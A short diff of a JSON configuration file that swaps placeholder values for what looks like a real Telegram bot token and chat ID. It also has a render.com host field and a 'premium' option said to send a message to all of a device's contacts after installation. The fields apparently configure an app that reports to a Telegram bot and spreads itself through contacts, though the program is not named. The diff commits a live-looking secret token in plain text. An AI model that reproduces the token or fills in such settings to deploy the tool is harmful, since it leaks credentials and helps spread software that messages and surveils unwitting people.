@@ -1,6 +1,6 @@
 {
-    "token": "your bot token",
-    "id": "your telegram chat id here",
+    "token": "6283064785:AAEeqXIpsXNJ6_gDXrACj2C8wakliPKUaO0",
+    "id": "6573270131",
     "host": "your render.com url here must use / after writing  url ex: https://google.com/",
     "text": "dont write anything here it works only in premium version this feature send  this line on all contacts after installation"
 }
